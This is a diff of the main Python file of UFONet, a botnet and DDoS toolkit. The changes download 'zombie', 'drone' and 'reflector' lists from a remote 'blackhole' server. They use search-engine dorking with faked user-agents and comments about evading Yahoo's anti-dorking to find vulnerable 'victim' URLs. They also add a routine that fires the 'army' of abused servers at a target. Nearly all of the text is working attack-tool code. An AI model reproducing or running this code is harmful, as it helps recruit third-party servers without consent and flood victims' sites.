-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/robots.txt.gz',
-                       robots)
-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/drones.txt.gz',
-                       drones)
-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/reflectors.txt.gz',
-                       reflectors)
+            print("[AI] Trying [Blackhole]: "+self.blackhole+"\n")
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if self.options.timeout: # set timeout
+                try:
+                    timeout = int(self.options.timeout)
+                except:
+                    timeout = 1 
             else:
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
-                       abductions)
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/troops.txt.gz',
-                       troops)
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/robots.txt.gz',
-                       robots)
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
-                       drones)
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
-                       reflectors)
-            print("Vortex: IS READY!")
+                timeout = 1 
+            if timeout < 1:
+                timeout = 1 
+            if self.options.forcessl:
+                if self.options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+		req = urllib2.Request('https://'+self.blackhole+'/ufonet/abductions.txt.gz', None, headers)
+                abductions_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('https://'+self.blackhole+'/ufonet/troops.txt.gz', None, headers)
+                troops_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('https://'+self.blackhole+'/ufonet/robots.txt.gz', None, headers)
+                robots_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('https://'+self.blackhole+'/ufonet/drones.txt.gz', None, headers)
+                drones_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('https://'+self.blackhole+'/ufonet/reflectors.txt.gz', None, headers)
+                reflectors_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+            else:
+                if self.options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/abductions.txt.gz', None, headers)
+                abductions_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/troops.txt.gz', None, headers)
+                troops_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/robots.txt.gz', None, headers)
+                robots_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/drones.txt.gz', None, headers)
+                drones_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/reflectors.txt.gz', None, headers)
+                reflectors_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+            f = open('abductions.txt.gz', 'w')
+            f.write(abductions_reply)
+            f.close()
+            f = open('troops.txt.gz', 'w')
+            f.write(troops_reply)
+            f.close()
+            f = open('robots.txt.gz', 'w')
+            f.write(robots_reply)
+            f.close()
+            f = open('drones.txt.gz', 'w')
+            f.write(drones_reply)
+            f.close()
+            f = open('reflectors.txt.gz', 'w')
+            f.write(reflectors_reply)
+            f.close()
+            print("[AI] [Control] [Blackhole] Reply: [VORTEX READY!] ;-)")
         except:
-            print("Vortex: FAILED!")
+            print("[AI] [Control] [Blackhole] Reply: [VORTEX FAILED!]")
             print '-'*12 + '\n'
-            print("[Error] - Unable to download list of 'zombies' from this 'blackhole'. ;(\n")
-            return #sys.exit(2)
+            print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] -> [Exiting!]\n")
+            return
         print '-'*12 + '\n'
-        f_in_abductions = gzip.open(abductions, 'rb')
+        f_in_abductions = gzip.open('abductions.txt.gz', 'rb')
         f_out_abductions = open('abductions.txt', 'wb')
         f_out_abductions.write(f_in_abductions.read())
         f_in_abductions.close()
         f_out_abductions.close()
-        os.remove(abductions) # remove abductions .gz file
-        f_in_troops = gzip.open(troops, 'rb')
+        os.remove('abductions.txt.gz') # remove abductions .gz file
+        f_in_troops = gzip.open('troops.txt.gz', 'rb')
         f_out_troops = open('troops.txt', 'wb')
         f_out_troops.write(f_in_troops.read())
         f_in_troops.close()
         f_out_troops.close()
-        os.remove(troops) # remove troops .gz file
-        f_in_robots = gzip.open(robots, 'rb')
+        os.remove('troops.txt.gz') # remove troops .gz file
+        f_in_robots = gzip.open('robots.txt.gz', 'rb')
         f_out_robots = open('robots.txt', 'wb')
         f_out_robots.write(f_in_robots.read())
         f_in_robots.close()
         f_out_robots.close()
-        os.remove(robots) # remove abductions .gz file
-        f_in_drones = gzip.open(drones, 'rb')
+        os.remove('robots.txt.gz') # remove robots .gz file
+        f_in_drones = gzip.open('drones.txt.gz', 'rb')
         f_out_drones = open('drones.txt', 'wb')
         f_out_drones.write(f_in_drones.read())
         f_in_drones.close()
         f_out_drones.close()
-        os.remove(drones) # remove reflectors .gz file
-        f_in_reflectors = gzip.open(reflectors, 'rb')
+        os.remove('drones.txt.gz') # remove drones .gz file
+        f_in_reflectors = gzip.open('reflectors.txt.gz', 'rb')
         f_out_reflectors = open('reflectors.txt', 'wb')
         f_out_reflectors.write(f_in_reflectors.read())
         f_in_reflectors.close()
         f_out_reflectors.close()
-        os.remove(reflectors) # remove reflectors .gz file
+        os.remove('reflectors.txt.gz') # remove reflectors .gz file
         num_abductions = 0
         with open('abductions.txt') as f:
             for _ in f:
                 num_abductions = num_abductions + 1
-        print("[Info] - Zombies: " + str(num_abductions))
+        print("[Info] Zombies: " + str(num_abductions))
         num_robots = 0
         with open('robots.txt') as f:
             for _ in f:
                 num_robots = num_robots + 1
-        print("[Info] - Droids : " + str(num_robots))
+        print("[Info] Droids : " + str(num_robots))
         num_troops = 0
         with open('troops.txt') as f:
             for _ in f:
                 num_troops = num_troops + 1
-        print("[Info] - Aliens : " + str(num_troops))
+        print("[Info] Aliens : " + str(num_troops))
         num_drones = 0
         with open('drones.txt') as f:
             for _ in f:
                 num_drones = num_drones + 1
-        print("[Info] - UCAVs  : " + str(num_drones))
+        print("[Info] UCAVs  : " + str(num_drones))
         num_reflectors = 0
         with open('reflectors.txt') as f:
             for _ in f:
                 num_reflectors = num_reflectors + 1
-        print("[Info] - X-RPCs : " + str(num_reflectors))
+        print("[Info] X-RPCs : " + str(num_reflectors))
         total_zombies = num_abductions + num_troops + num_robots + num_drones + num_reflectors
-        print("\n[Info] - Congratulations!. Total downloaded: " + str(total_zombies))
+        print("\n[Info] [AI] Congratulations!. Total downloaded: " + str(total_zombies))
         print '-'*12
         if not self.options.forceyes:
-            update_reply = raw_input("\nWant to merge ONLY new 'troops' in your army? (Y/n)")
+            update_reply = raw_input("\n[AI] Do you want to merge ONLY the new 'troops' into your army? (Y/n)")
             print '-'*25
         else:
             update_reply = "Y"
@@ -1597,7 +1997,9 @@ class UFONet(object):
             os.remove('robots.txt') # remove robots file
             os.remove('drones.txt') # remove drones file
             os.remove('reflectors.txt') # remove reflectors file
-            print "\n[Info] - List downloaded has been removed. Bye!\n"
+            print "\n[Info] [AI] [Control] Temporal list downloaded has been removed! -> [Exiting!]"
+            print '-'*25
+            print "\n[AI] "+self.exit_msg+"\n"
         else:
             zombies_ready = []
             f = open('abductions.txt')
@@ -1674,8 +2076,25 @@ class UFONet(object):
                     pass
             self.update_rpcs(rpcs_ready)
             os.remove('reflectors.txt') # remove reflectors .txt file
-            print "\n[Info] - Botnet updated! ;-)\n"
+            print "\n[Info] [AI] Botnet updated! -> ;-)"
             self.update_transferred_stats(self.trans_zombies) # update json file with transferred stats (blackhole)
+            if not self.options.forceyes: # ask for update everything
+                print '-'*25 + "\n"
+                update_reply = raw_input("[AI] You would also like to update other content: [News] [Grid] [Board]... (Y/n)")
+            else:
+                update_reply = "Y"
+            if update_reply == "n" or update_reply == "N":
+                print "\n[AI] "+self.exit_msg+"\n"
+                return
+            else:
+                try:
+                    update_gui = self.update_gui_data() # update GUI data
+                except:
+                    print '-'*25 +"\n"
+                    print "[Error] [AI] Something wrong downloading GUI content! -> [Aborting!]"
+                    print '-'*25
+                    print "\n[AI] "+self.exit_msg+"\n"
+                    return
 
     def create_web_interface(self):
         # launch webserver+gui
@@ -1697,13 +2116,6 @@ class UFONet(object):
         except (KeyboardInterrupt, SystemExit):
             sys.exit()
 
-#    def crawlering(self):
-#        # crawl target's links to discover web structure           
-#        options = self.options
-#        myurl = options.crawl
-#        for i in re.findall('''href=["'](.[^"']+)["']''', urllib.urlopen(myurl).read(), re.I):
-#            print i 
-
     def extract_dorks(self):
         # extract dorks from file (ex: 'dorks.txt')
         try:
@@ -1713,17 +2125,17 @@ class UFONet(object):
             f.close()
             if not dorks:
                 if not options.autosearch:
-                    print "\n[Error] - Imposible to retrieve 'dorks' from file.\n"
+                    print "[Error] [AI] [Control] Cannot retrieve [Dorks] from: 'botnet/dorks.txt' -> [Aborting!]\n"
                 return
             else:
                 return dorks
         except:
             if not options.autosearch:
                 if os.path.exists(self.dorks_file) == True:
-                    print '[Error] - Cannot open:', 'dorks.txt', "\n"
+                    print "[Error] [AI] [Control] Cannot open [Dorks] from: 'botnet/dorks.txt' -> [Aborting!]\n"
                     return #sys.exit(2)
                 else:
-                    print '[Error] - Cannot found:', 'dorks.txt', "\n"
+                    print "[Error] [AI] [Control] Cannot found [Dorks] from: 'botnet/dorks.txt' -> [Aborting!]\n"
                     return #sys.exit(2)
             else:
                 return
@@ -1733,46 +2145,8 @@ class UFONet(object):
         options = self.options
         zombies = []
         if not options.engine: # default search engine
-            options.engine = 'yahoo'
-        #if options.engine == 'duck': # using duck [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
-        #    url = 'https://duckduckgo.com/html/' # ex: POST -> path
-        #    if options.search: # search from query
-        #       q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results [ deprecated ]
-        #    if options.dorks: # search from a dork
-        #       q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results [ deprecated ]
-        #    data = 'q=' + q + '&b=&kl=us-en&kp=-1' # evade safe search
-        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
-        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
-        #    if options.verbose:
-        #        print("[Info] Query used: " + url + " [POST -> " + data + "]\n")
-        #    try:
-        #        req = urllib2.Request(url, data, headers)
-        #        rsp = urllib2.urlopen(req)
-        #        content = rsp.read()
-        #    except:
-        #        print('[Error] - Unable to connect to duck\n')
-        #        if options.allengines:
-        #            return
-        #        if not options.dorks:
-        #            if not self.options.forceyes:
-        #                update_reply = raw_input("Want to try a different search engine? (Y/n)")
-        #            else:
-        #                update_reply = "Y"
-        #            if update_reply == "n" or update_reply == "N":
-        #                return #sys.exit(2)
-        #            print "\nSearch engines available:"
-        #            print '-'*25
-        #            for e in self.search_engines:
-        #                print "+ "+e
-        #            print '-'*25
-        #            print "\nEx: ufonet -s 'proxy.php?url=' --se 'duck'"
-        #            return #sys.exit(2)
-        #        else:
-        #            req_reply = ''
-        #    regex = '<a class="result__url" href="(.+?)"' # regex magics [05/08/2016]
-        #    pattern = re.compile(regex)
-        #    url_links = re.findall(pattern, req_reply)
-        if options.engine == 'bing': # using bing [04/02/2018: OK!]
+            options.engine = 'startpage'
+        if options.engine == 'bing': # using bing [28/02/2019: OK!]
             url = 'https://www.bing.com/search?'
             if options.search: # search from query
                 q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
@@ -1787,15 +2161,17 @@ class UFONet(object):
             if options.verbose:
                 print("Query used: " + url + "\n")
             try:
+                if options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
                 req = urllib2.Request(url, None, headers)
-                req_reply = urllib2.urlopen(req).read()
+                req_reply = urllib2.urlopen(req, context=self.ctx).read()
             except:
-                print('[Error] Unable to connect to: bing\n')
+                print('[Error] [AI] Unable to connect to: bing\n')
                 if options.allengines or options.autosearch:
                     return
                 if not options.dorks or not options.autosearch:
                     if not self.options.forceyes:
-                        update_reply = raw_input("Want to try a different search engine? (Y/n)")
+                        update_reply = raw_input("[AI] Do you want to try a different search engine? (Y/n)")
                     else:
                         update_reply = "Y"
                     if update_reply == "n" or update_reply == "N":
@@ -1805,71 +2181,31 @@ class UFONet(object):
                     for e in self.search_engines:
                         print "+ "+e
                     print '-'*25
-                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'"
+                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'startpage'"
                     return #sys.exit(2)
                 else:
                     req_reply = ''
             regex = '<li class="b_algo"><h2><a href="(.+?)">' # regex magics
             pattern = re.compile(regex)
             url_links = re.findall(pattern, req_reply)
-        #elif options.engine == 'google': # google [07/10/2015: OK!] [09/08/2016: not working from TOR]
-        #    url = 'https://www.google.com/xhtml?'
-        #    if options.search: # search from query
-        #        q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
-        #    if options.dorks: # search from a dork
-        #        q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
-        #    start = 0 # set index number of first entry
-        #    if options.num_results: # set number of results to search
-        #        try:
-        #            num = int(options.num_results)
-        #        except:
-        #            print("You should specify an integer!!!. Using default value: 10\n")
-        #            num = 10
-        #    else:
-        #        num = 10 
-        #    gws_rd = 'ssl' # set SSL as default
-        #    query_string = { 'q':q, 'start':start, 'num':num, 'gws_rd':gws_rd }
-        #    data = urllib.urlencode(query_string)
-        #    url = url + data
-        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
-        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
-        #    if options.verbose:
-        #        print("Query used: " + url + "\n")
-        #    try:
-        #        req = urllib2.Request(url, None, headers)
-        #        req_reply = urllib2.urlopen(req).read()
-        #    except: 
-        #        print('[Error] - Unable to connect to google\n')
-        #        if options.allengines:
-        #            return
-        #        if not options.dorks:
-        #            if not self.options.forceyes:
-        #                update_reply = raw_input("Want to try a different search engine? (Y/n)")
-        #            else:
-        #                update_reply = "Y"
-        #            if update_reply == "n" or update_reply == "N":
-        #                return #sys.exit(2)
-        #            print "\nSearch engines available:"
-        #            print '-'*25
-        #            for e in self.search_engines:
-        #                print "+ "+e
-        #            print '-'*25
-        #            print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
-        #            return #sys.exit(2)
-        #        else:
-        #            req_reply = ''
-        #    regex = '<h3 class="r"><a href="/url(.+?)">' # regex magics
-        #    pattern = re.compile(regex)
-        #    url_links = re.findall(pattern, req_reply)
-        elif options.engine == 'yahoo': # yahoo [27/06/2017: OK!]
-            #location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # generate 'flags' for location servers to evade Yahoo anti-dorking on main search webpage [grey magic: 18/08/2016]
-            location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
+        elif options.engine == 'yahoo': # yahoo [28/02/2019: OK!]
+            location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # evading Yahoo anti-dorking [grey magic: 28/02/2019]
+            #location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
             location = str(random.choice(location).strip()) # shuffle location
-            url = 'https://'+location+'.search.yahoo.com/search?'
+            if location == "jp": # [28/02/2019]
+                url = 'https://search.yahoo.co.jp/search?'
+            else:
+                url = 'https://'+location+'.search.yahoo.com/search?'            
             if options.search: # search from query
-                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
+                if location == "jp":
+                    q = '"' + str(options.search) + '"' # set query to search literally on results
+                else:
+                    q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
             if options.dorks or options.autosearch: # search from a dork
-                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
+                if location == "jp":
+                    q = '"' + str(dork) + '"' # set query to search literally on results
+                else:
+                    q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
             start = 0 # set index number of first entry
             query_string = { 'p':q, 'b':start }
             data = urllib.urlencode(query_string)
@@ -1879,15 +2215,17 @@ class UFONet(object):
             if options.verbose:
                 print("Query used: " + url + "\n")
             try:
+                if options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
                 req = urllib2.Request(url, None, headers)
-                req_reply = urllib2.urlopen(req).read()
+                req_reply = urllib2.urlopen(req, context=self.ctx).read()
             except:
-                print('[Error] Unable to connect to: yahoo\n')
+                print('[Error] [AI] Unable to connect to: yahoo\n')
                 if options.allengines or options.autosearch:
                     return
                 if not options.dorks or not options.autosearch:
                     if not self.options.forceyes:
-                        update_reply = raw_input("Want to try a different search engine? (Y/n)")
+                        update_reply = raw_input("[AI] Do you want to try a different search engine? (Y/n)")
                     else:
                         update_reply = "Y"
                     if update_reply == "n" or update_reply == "N":
@@ -1905,58 +2243,91 @@ class UFONet(object):
             regex = 'href="(.+?)" target="_blank" data' # regex magics [08/04/2017]
             pattern = re.compile(regex)
             url_links = re.findall(pattern, req_reply)
-        #elif options.engine == 'yandex': # yandex [07/10/2015: OK!]
-        #    url = 'https://yandex.ru/search/?'
-        #    if options.search: # search from query
-        #        q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
-        #    if options.dorks or options.autosearch: # search from a dork
-        #        q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
-        #    start = 0 # set index number of first entry
-        #    lr = '213' # [27/06/2017: OK!]
-        #    query_string = { 'text':q, 'lr':lr, 'p':start }
-        #    data = urllib.urlencode(query_string)
-        #    url = url + data
-        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
-        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
-        #    if options.verbose:
-        #        print("Query used: " + url + "\n")
-        #    try:
-        #        req = urllib2.Request(url, None, headers)
-        #        req_reply = urllib2.urlopen(req).read()
-        #    except:
-        #        print('[Error] - Unable to connect to yandex\n')
-        #        if options.allengines or options.autosearch:
-        #            return
-        #        if not options.dorks or not options.autosearch:
-        #            if not self.options.forceyes:
-        #                update_reply = raw_input("Want to try a different search engine? (Y/n)")
-        #            else:
-        #                update_reply = "Y"
-        #            if update_reply == "n" or update_reply == "N":
-        #                return #sys.exit(2)
-        #            print "\nSearch engines available:"
-        #            print '-'*25
-        #            for e in self.search_engines:
-        #                print "+ "+e
-        #            print '-'*25
-        #            print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
-        #            return #sys.exit(2)
-        #        else:
-        #            req_reply = ''
-            #regex = '<a class="link link_cropped_no serp-item__title-link" target="_blank" href="(.+?)"' # regex magics
-        #    if 'captchaSound' in req_reply: # detecting captcha reply
-        #        print "[Info] - This search engine is asking for a captcha...\n"
-        #        if options.allengines or options.autosearch:
-        #            url_links = "" # keep running!
-        #    else:
-        #        regex = 'target="_blank" href="(.+?)" onmousedown="rc' # [27/06/2017] regex magics
-        #        pattern = re.compile(regex)
-        #        url_links = re.findall(pattern, req_reply)
+        elif options.engine == 'startpage': # startpage [28/02/2019: OK!]
+            url = 'https://www.startpage.com/do/asearch'
+            if options.search: # search from query
+                q = 'url:"' + str(options.search) + '"' # set query to search literally on results
+            if options.dorks or options.autosearch: # search from a dork
+                q = 'url:"' + str(dork) + '"' # set query from a dork to search literally on results
+            query_string = { 'cmd':'process_search', 'query':q }
+            data = urllib.urlencode(query_string)
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if options.verbose:
+                print("Query used: " + url + " (POST: "+ data + ")\n")
+            try:
+                if options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+                req = urllib2.Request(url, data, headers) # HTTP POST request
+                req_reply = urllib2.urlopen(req, context=self.ctx).read()
+            except:
+                print('[Error] [AI] Unable to connect to: startpage\n')
+                if options.allengines or options.autosearch:
+                    return
+                if not options.dorks or not options.autosearch:
+                    if not self.options.forceyes:
+                        update_reply = raw_input("[AI] Do you want to try a different search engine? (Y/n)")
+                    else:
+                        update_reply = "Y"
+                    if update_reply == "n" or update_reply == "N":
+                        return #sys.exit(2)
+                    print "\nSearch engines available:"
+                    print '-'*25
+                    for e in self.search_engines:
+                        print "+ "+e
+                    print '-'*25
+                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'"
+                    return #sys.exit(2)
+                else:
+                    req_reply = ''
+            regex = 'href="(.+?)"  target="_blank"  rel' # regex magics [08/04/2017]
+            pattern = re.compile(regex)
+            url_links = re.findall(pattern, req_reply)
+        elif options.engine == 'duck': # using duckduckgo [28/02/2019: OK!]
+            url = 'https://duckduckgo.com/html/'
+            if options.search: # search from query
+                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
+            if options.dorks or options.autosearch: # search from a dork
+                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
+            query_string = { 'q':q }
+            data = urllib.urlencode(query_string)
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if options.verbose:
+                print("Query used: " + url + " (POST: "+ data + ")\n")
+            try:
+                if options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+                req = urllib2.Request(url, data, headers) # HTTP POST request
+                req_reply = urllib2.urlopen(req, context=self.ctx).read()
+            except:
+                print('[Error] [AI] Unable to connect to: duck\n')
+                if options.allengines or options.autosearch:
+                    return
+                if not options.dorks or not options.autosearch:
+                    if not self.options.forceyes:
+                        update_reply = raw_input("[AI] Do you want to try a different search engine? (Y/n)")
+                    else:
+                        update_reply = "Y"
+                    if update_reply == "n" or update_reply == "N":
+                        return #sys.exit(2)
+                    print "\nSearch engines available:"
+                    print '-'*25
+                    for e in self.search_engines:
+                        print "+ "+e
+                    print '-'*25
+                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'startpage'"
+                    return #sys.exit(2)
+                else:
+                    req_reply = ''
+            regex = 'snippet" href="(.+?)">' # regex magics
+            pattern = re.compile(regex)
+            url_links = re.findall(pattern, req_reply)
         else: # no valid search engine
-            print('[Error] - This search engine is not supported!\n')
+            print('[Error] [AI] This search engine is not supported!\n')
             if not options.dorks or options.autosearch:
                 if not self.options.forceyes:
-                    update_reply = raw_input("Want to try a different search engine? (Y/n)")
+                    update_reply = raw_input("[AI] Do you want to try a different search engine? (Y/n)")
                 else:
                     update_reply = "Y"
                 if update_reply == "n" or update_reply == "N":
@@ -1966,7 +2337,7 @@ class UFONet(object):
                 for e in self.search_engines:
                     print "+ "+e
                 print '-'*25
-                print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
+                print "\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'"
                 return #sys.exit(2)
             else:
                 req_reply = ''
@@ -1974,7 +2345,7 @@ class UFONet(object):
             try:
                 num = int(options.num_results)
             except:
-                print("You should specify an integer!!!. Using default value: 10\n")
+                print("[Info] [AI] You should specify an integer!... Using default value: 10\n")
                 num = 10
         else:
             num = 10
@@ -1990,9 +2361,6 @@ class UFONet(object):
                     url = url.rsplit('RU=',1)[1] 
                 if 'UTF-8&u=' in url: # regex magics [05/02/2018]
                     url = url.rsplit('UTF-8&u=',1)[1]  
-            #if options.engine == "yandex":
-            #    if 'rel="' in url: # regex magics [27/06/2017]
-            #        url = url.rsplit('rel=',1)[1] 
             total_results = total_results + 1 # results counter
             url_link = url.strip('?q=') # parse url_links to retrieve only a url
             url_link = urllib.unquote(url_link).decode('utf8') # unquote encoding
@@ -2019,7 +2387,7 @@ class UFONet(object):
                 else:
                     pass
         if len(zombies) == 0: # print dorking results
-            print "[Info] - NOT any NEW victim(s) found for this query!"
+            print "[Info] [AI] NOT any NEW victim(s) found for this query!"
             if not options.dorks:
                 if not options.autosearch:
                     if not self.options.forceyes:
@@ -2031,32 +2399,31 @@ class UFONet(object):
     def check_nat(self):
         # check for NAT configuration
         options = self.options
-        tor_reply = urllib2.urlopen("https://check.torproject.org").read() # check if TOR is enabled
+        tor_reply = urllib2.urlopen(self.check_tor_url).read() # check if TOR is enabled
         your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip()
+        check_ip_service = None
         if not tor_reply or 'Congratulations' not in tor_reply:
-            print("[Info] It seems that you are not using TOR to recieve data. Good!\n")
+            print("[Info] [AI] It seems that you are not using TOR to recieve data. -> [OK!]\n")
         else:
-            print("[Error] You are using TOR as public IP... It's not possible to NAT!\n")
+            print("[Error] [AI] You are using TOR as public IP... It's not possible to NAT! -> [Aborting!]\n")
             self.nat_error_flag = "ON"
             return #sys.exit(2)
         try:
-            if options.forcessl:
-                data = str(urlopen('https://checkip.dyndns.com/').read()) # check for public ip
-            else:
-                data = str(urlopen('http://checkip.dyndns.com/').read()) # check for public ip
+            data = str(urlopen(self.check_ip_service1).read()) # check for public ip
             self.pub_ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
+            check_ip_service = self.check_ip_service1
         except:
             try: # another check for public ip
-                if options.forcessl:
-                    data = str(urlopen('https://whatismyip.org/').read())
-                else:
-                    data = str(urlopen('http://whatismyip.org/').read())
+                data = str(urlopen(self.check_ip_service2).read())
                 self.pub_ip = re.compile(r'">(\d+\.\d+\.\d+\.\d+)</span>').search(data).group(1)
+                check_ip_service = self.check_ip_service2
             except:
-                print("[Error] Something wrong checking your public IP using an external service. Try it again!\n")
+                print("[Error] [AI] Something wrong checking your public IP! -> [Exiting!]\n")
                 self.nat_error_flag = "ON"
-                return #sys.exit(2)
-        print " + Public: " + self.pub_ip + "\n"
+                return
+        t = urlparse(check_ip_service)
+        name_service = t.netloc
+        print " + Public: " + self.pub_ip + " | "+name_service+"\n"
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(('8.8.8.8', 0))  # connecting to a UDP address doesn't send packets (black magic)
         self.local_ip = s.getsockname()[0]
@@ -2072,27 +2439,48 @@ class UFONet(object):
             ucavs = [ ucav.replace('\n','') for ucav in ucavs ]
             f.close()
             if not ucavs:
-                print "\n[Error] - Imposible to retrieve 'ucavs' from file.\n"
+                print "[Info] [AI] [Control] Cannot retrieve [UCAVs] from: 'botnet/ucavs.txt' -> [Discarding!]"
+                self.options.disableucavs = True
                 return
             else:
                 return ucavs
         except:
             if os.path.exists(self.ucavs_file) == True:
-                print '\n[Error] - Cannot open:', 'ucavs.txt', "\n"
+                print "[Info] [AI] [Control] Cannot open [UCAVs] from: 'botnet/ucavs.txt' -> [Discarding!]"
                 return #sys.exit(2)
             else:
-                print '\n[Error] - Cannot found:', 'ucavs.txt', "\n"
+                print "[Info] [AI] [Control] Cannot found [UCAVs] from: 'botnet/ucavs.txt' -> [Discarding!]"
                 return #sys.exit(2)
 
-    def check_is_up(self, target):
+    def discarding_ucavs(self, ucav, ucavs):
+        if ucav in self.discard_ucavs:
+            ucavs.remove(ucav)
+            if self.options.verbose:
+                print("[Info] [AI] [Control] [UCAVs] "+str(ucav)+" is not working! -> [Discarding!]")
+            self.ucavs_fail = self.ucavs_fail + 1 # add ucav fail to stats
+        return ucavs
+
+    def send_ucavs(self, ucavs):
         # extract external status checkers, perform a request and check results
+        time.sleep(5) # aiming (multi-threading flow time compensation)
+        if not self.options.disablepurge:
+            if not ucavs: # return when not any working
+                self.options.disableucavs = True
+                return
         options = self.options
-        num_is_up = 0 # counter for 'up' reports
-        num_is_down = 0 # counter for 'down' reports
-        print "\n[Info] Flying some UCAV with 'heat-beam' weapons...\n"
-        ucavs = self.extract_ucavs() # extract ucavs from file
-        self.total_ucavs = len(ucavs) # add total of ucavs to stats
-        shuffle(ucavs) # shuffle ucavs
+        target = self.options.target
+        shuffle(ucavs) # shuffle ucavs order, each round :-)
+        if not self.options.disablepurge:
+            for ucav in ucavs:
+                if not ucav.startswith('http'): # discarded inmediately
+                    self.discard_ucavs.append(ucav)
+                    self.num_discard_ucavs = self.num_discard_ucavs + 1
+                ucavs = self.discarding_ucavs(ucav, ucavs) # check if ucav is failing for autobalance army
+        if not self.options.disablepurge:
+            if not ucavs: # return when not any working
+                self.options.disableucavs = True
+                return
+        shuffle(ucavs) # shuffle ucavs order, each discarding check :-)
         for ucav in ucavs:
             self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
@@ -2101,65 +2489,43 @@ class UFONet(object):
             elif target.startswith("https://"):
                 target = target.replace('https://','')
             url = ucav + target
+            t = urlparse(ucav)
+            name_ucav = t.netloc
+            if name_ucav == "":
+                name_ucav = ucav
             if options.verbose:
-                print("[Info] Sniping: " + url)
+                print("[Info] [UCAVs] Sniping: " + url)
             try:
                 if options.proxy: # set proxy
                     self.proxy_transport(options.proxy)
-                    req = urllib2.Request(url, None, headers)
-                    target_reply = urllib2.urlopen(req).read()
+                if options.timeout: # set timeout
+                    ucav_timeout = options.timeout
                 else:
-                    req = urllib2.Request(url, None, headers)
-                    target_reply = urllib2.urlopen(req, context=self.ctx).read()
+                    ucav_timeout = 1 
+                if ucav_timeout < 1:
+                    ucav_timeout = 1 
+                req = urllib2.Request(url, None, headers)
+                target_reply = urllib2.urlopen(req, context=self.ctx, timeout=ucav_timeout).read()
                 self.ucavs_hit = self.ucavs_hit + 1 # add ucav hit to stats
             except:
-                print "[Error] UCAV: " + ucav + " -> FAILED (cannot connect!)"
